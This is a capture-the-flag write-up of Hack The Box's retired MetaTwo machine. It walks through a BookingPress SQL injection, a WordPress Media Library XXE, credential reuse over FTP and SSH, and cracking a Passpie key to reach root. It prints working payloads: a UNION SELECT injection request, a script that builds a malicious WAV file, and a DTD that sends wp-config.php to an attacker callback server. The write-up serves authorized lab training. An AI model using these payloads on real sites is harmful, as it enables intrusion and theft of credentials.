---
title: "Hack The Box — MetaTwo"
summary: "MetaTwo chains BookingPress SQL injection, WordPress Media Library XXE, exposed FTP and SSH credentials, and Passpie key cracking to reach root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-09-23
publishedAt: 2026-09-23
tags:
  - wordpress
  - bookingpress
  - sql-injection
  - password-cracking
  - xxe
  - ftp
  - ssh
  - passpie
  - privilege-escalation
tools:
  - Nmap
  - curl
  - jq
  - Hashcat
  - PHP
  - Python
  - John the Ripper
  - SSH
cves:
  - CVE-2022-0739
  - CVE-2021-29447
htbUrl: "https://app.hackthebox.com/machines/MetaTwo"
cover: "/images/writeups/hackthebox/machines/metatwo/metatwo.png"
coverAlt: "Hack The Box MetaTwo machine logo with a colorful cube inside a green ring"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. The [official MetaTwo page](https://www.hackthebox.com/machines/metatwo) identified it as a **Retired Machine** on 23 September 2026. Flag values, personal VPN addresses, tokens, and unrelated secrets are omitted. Commands show how to recover the lab credentials needed to reproduce the path.

## Executive summary

MetaTwo begins with a WordPress event page using a vulnerable BookingPress release. An unauthenticated SQL injection exposes the `manager` password hash, which can be cracked with a wordlist. The account can upload media, making a WordPress Media Library XXE reachable. A crafted WAV file reads `wp-config.php` and discloses FTP credentials. An FTP-accessible mail script contains credentials that also work for SSH as `jnelson`. In that user's home directory, Passpie stores a root credential behind an encrypted PGP private key. Cracking the key's passphrase allows Passpie to export the root password.

## Target information

| Item | Value |
| --- | --- |
| Target | MetaTwo |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | Retired, confirmed by the [official machine page](https://www.hackthebox.com/machines/metatwo) |
| Solved | 23 September 2026 |
| Main weaknesses | [CVE-2022-0739](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/), [CVE-2021-29447](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh), exposed credentials, crackable Passpie key |

Target and VPN IP addresses change between lab sessions. In the commands below, set them to the addresses assigned to your own instance:

```bash
export TARGET_IP='<TARGET_IP>'
export LHOST='<YOUR_TUN0_IP>'
```

## Enumeration

I started with Nmap's default scripts and version detection:

```bash
nmap "$TARGET_IP" -T5 -sVC -p-
```

The useful results were:

```text
21/tcp  open  ftp
22/tcp  open  ssh   OpenSSH 8.4p1 Debian
80/tcp  open  http  nginx 1.18.0
```

HTTP redirected to `http://metapress.htb/`, so I mapped that name locally:

```bash
echo "$TARGET_IP metapress.htb" | sudo tee -a /etc/hosts
curl -I http://metapress.htb/
```

The home page linked to `/events/`. That page used BookingPress for event signup. Its source contained a request for the `bookingpress_front_get_category_services` AJAX action, including a nonce. The installed plugin version was 1.0.10, within the range affected by CVE-2022-0739. [WPScan's verified advisory](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/) identifies `total_service` in this unauthenticated action as the SQL injection point.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| nginx redirected to `metapress.htb` | The virtual host had to resolve before web enumeration would work. |
| `/events/` loaded BookingPress 1.0.10 | The plugin version was affected by CVE-2022-0739. |
| The event page embedded an AJAX nonce | The exploit request needed the current nonce; a copied value could expire. |
| FTP and SSH listened alongside HTTP | Credentials recovered through the web application might provide another access path. |

## Initial access

### Extracting the BookingPress nonce

I inspected the code around the AJAX action:

```bash
curl -s http://metapress.htb/events/ \
  | grep -A 5 'bookingpress_front_get_category_services'
```

The nonce was on a following line in the page source, so grepping for the action alone did not display it. I extracted the single-quoted value and verified it was nonempty:

```bash
NONCE=$(curl -s http://metapress.htb/events/ \
  | grep -oP "_wpnonce\s*:\s*'\K[^']+" | head -1)

test -n "$NONCE" && echo 'BookingPress nonce extracted'
```

The nonce is an input to this AJAX request, not authentication. The action remains available without a WordPress login.

### Dumping the `manager` password hash

The vulnerable query returns nine columns. A `UNION ALL SELECT` maps `user_login` and `user_pass` from `wp_users` into the first two JSON fields:

```bash
curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services' \
  --data "_wpnonce=$NONCE" \
  --data 'category_id=33' \
  --data-urlencode \
    'total_service=-7502) UNION ALL SELECT user_login,user_pass,3,4,5,6,7,8,9 FROM wp_users-- -' \
  | tee sqli.json | jq .
```

In the injected rows, `bookingpress_service_id` contained the username and `bookingpress_category_id` contained its password hash. I selected `manager` rather than the unrelated `admin` entry:

```bash
jq -r '.[] | select(.bookingpress_service_id=="manager") |
  .bookingpress_category_id' sqli.json > manager.hash

cat manager.hash
```

The value began with `$P$`, the portable PHPass format used by this WordPress installation. Hashcat mode `400` recovered the plaintext with `rockyou`:

```bash
hashcat -m 400 -a 0 manager.hash /usr/share/wordlists/rockyou.txt
hashcat -m 400 --show manager.hash
```

I used the recovered password to log in as `manager` at `http://metapress.htb/wp-login.php`. The account had access to the Media Library.

### Reading `wp-config.php` through the Media Library XXE

The target's WordPress 5.6.2 installation ran on PHP 8, satisfying the conditions in the [WordPress advisory for CVE-2021-29447](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh). The Media Library parsed XML inside a WAV `iXML` chunk. Because the parsed XML was not returned in the WordPress response, I used an external DTD and an HTTP callback to read a local file. The [original technical write-up](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/) explains this blind XXE mechanism.

On Kali, I wrote a DTD that Base64-encodes `wp-config.php` before putting its contents in a callback URL:

```bash
cat > evil.dtd <<EOF
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://${LHOST}:8000/?p=%file;'>">
EOF
```

I then placed the XML reference inside a small WAV file:

```bash
python3 - <<'PY'
import os
from pathlib import Path

host = os.environ['LHOST']
xml = ('<?xml version="1.0"?>'
       '<!DOCTYPE ANY[<!ENTITY % remote SYSTEM '
       f'"http://{host}:8000/evil.dtd">'
       '%remote;%init;%trick;]>')
payload = xml.encode() + b'\x00'
chunk = b'iXML' + len(payload).to_bytes(4, 'little') + payload
wave = b'WAVE' + chunk
Path('payload.wav').write_bytes(
    b'RIFF' + len(wave).to_bytes(4, 'little') + wave
)
PY
```

I started a web server in that directory and uploaded `payload.wav` through **Media → Add New** in the WordPress dashboard:

```bash
php -S 0.0.0.0:8000 2>&1 | tee xxe.log
```

The server log showed a successful `GET /evil.dtd`, followed by `GET /?p=<base64-data>`. The second request returned HTTP 404 because `/` was only a callback endpoint; the request itself proved that the file content reached my listener. I decoded the first callback and selected the FTP settings:

```bash
grep -oP '(?<=\?p=)[A-Za-z0-9+/=]+' xxe.log \
  | head -1 | base64 -d \
  | grep -E 'FTP_USER|FTP_PASS|FTP_HOST'
```

The `wp-config.php` values included an FTP account for the site. I used the extracted values, without relying on an anonymous FTP login:

```bash
FTP_USER='<FTP_USER_FROM_CONFIG>'
FTP_PASS='<FTP_PASS_FROM_CONFIG>'

curl --ftp-pasv --user "$FTP_USER:$FTP_PASS" \
  "ftp://${TARGET_IP}/mailer/send_mail.php" \
  --output send_mail.php

grep -E 'Username|Password' send_mail.php
```

The mail script configured SMTP with a `jnelson` account. Its password also authenticated that user over SSH:

```bash
ssh jnelson@"$TARGET_IP"
cat /home/jnelson/user.txt
```

The user flag was recovered; its value is intentionally omitted.

## Privilege escalation

### Discovering Passpie's encrypted credential store

From the `jnelson` SSH shell, `sudo -l` did not grant a usable privileged command. A home-directory listing instead revealed `.passpie`. Passpie is a password manager that encrypts YAML credential files using GnuPG and a master passphrase. [Its project documentation](https://github.com/marcwebbie/passpie) describes this storage model.

```bash
ls -la ~/.passpie
passpie list
cat ~/.passpie/ssh/root.pass
```

The listing included `root@ssh`; `root.pass` held an encrypted PGP message. The `.passpie/.keys` file contained both public and private key blocks. I copied it to Kali and extracted only the private key block:

```bash
# Run these commands on Kali, with TARGET_IP set as above.
scp jnelson@"$TARGET_IP":/home/jnelson/.passpie/.keys ./passpie.keys

sed -n '/-----BEGIN PGP PRIVATE KEY BLOCK-----/,/-----END PGP PRIVATE KEY BLOCK-----/p' \
  passpie.keys > private.key

gpg2john private.key > passpie.hash
john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt passpie.hash
john --format=gpg --show passpie.hash
```

John recovered the private key's passphrase. That passphrase unlocks Passpie; it is **not** the root account password. Back in the `jnelson` SSH shell, I exported the stored credentials:

```bash
cd ~
passpie export /tmp/metatwo-credentials.yml
# Enter the passphrase recovered by John at the prompt.
grep -A6 'fullname: root@ssh' /tmp/metatwo-credentials.yml
```

The `password` field of the `root@ssh` entry was the value accepted by `su -`:

```bash
rm -f /tmp/metatwo-credentials.yml
su -
# Enter the root@ssh password from the Passpie export.
id
cat /root/root.txt
```

The shell reported `uid=0(root)`, and the root flag was recovered. Its value is omitted.

## What did not work

- `sudo -l` returned that `jnelson` could not run `sudo` on the host. I followed the local credential evidence instead.
- Trying the cracked Passpie **master passphrase** with `su -` failed. The encrypted `root@ssh` entry had to be exported to reveal the separate root password.
- An interactive FTP attempt sent `ls` while the delayed connection banner was still appearing. The server interpreted `ls` as the username and rejected the login. Using `curl --ftp-pasv` with the recovered credentials made the file retrieval unambiguous.

## Attack path

1. Nmap found FTP, SSH and a WordPress website behind the `metapress.htb` virtual host.
2. The BookingPress event form exposed an unauthenticated SQL injection and a current nonce.
3. A `UNION ALL SELECT` returned the `manager` PHPass hash; Hashcat recovered its password.
4. Authenticated media upload triggered the WordPress XXE, exposing FTP credentials from `wp-config.php`.
5. The FTP mail script revealed a password reused for `jnelson` SSH access and the user flag.
6. John cracked the Passpie private key passphrase; Passpie exported the root password, enabling `su -` and the root flag.

## Lessons learned

- A nonce embedded in a public form does not substitute for access control or parameterized queries. BookingPress passed attacker-controlled input into SQL despite requiring the nonce.
- File-upload authorization does not make parsing safe. External XML entities in media metadata allowed the web process to read local configuration and send its contents to a callback server.
- Credentials stored in configuration and scripts can connect separate services into one attack path. The FTP and SSH steps depended on those exposed secrets.
- An encrypted password manager is only as strong as its master passphrase and private-key protection. The Passpie store contained a privileged credential recoverable with a common wordlist.
- During a solve, distinguish credentials by purpose: the WordPress password, FTP password, SSH password, Passpie passphrase and root password crossed different authentication boundaries.

## References

- [Hack The Box — MetaTwo (official retired machine page)](https://www.hackthebox.com/machines/metatwo)
- [WPScan — BookingPress unauthenticated SQL injection, CVE-2022-0739](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/)
- [WordPress security advisory — Media Library XXE, CVE-2021-29447](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh)
- [WPSec — WordPress XXE in the Media Library](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)
- [Passpie project documentation](https://github.com/marcwebbie/passpie)
